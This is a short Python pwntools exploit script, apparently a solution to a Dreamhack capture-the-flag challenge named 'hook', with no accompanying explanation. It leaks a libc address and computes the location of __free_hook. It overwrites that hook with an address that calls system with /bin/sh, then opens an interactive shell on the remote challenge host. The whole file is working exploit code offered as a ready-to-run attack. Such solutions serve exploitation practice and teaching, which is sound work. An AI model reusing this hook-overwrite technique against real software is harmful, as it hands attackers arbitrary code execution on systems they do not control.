#!/usr/bin/env python3

from pwn import *

exe = ELF("./hook_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 18491)

    return r


def main():
    r = conn()

    r.recvuntil(b"stdout: ")
    
    stdout = int(r.recvuntil(b"\n", drop=True), 16)
    
    r.sendlineafter(b"Size: ", b"16")

    libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
    __free_hook = libc_base + libc.symbols["__free_hook"]
    call_system_with_binsh = 0x400a11

    payload = p64(__free_hook) + p64(call_system_with_binsh)
    r.sendafter(b"Data: ", payload)

    r.interactive()


if __name__ == "__main__":
    main()
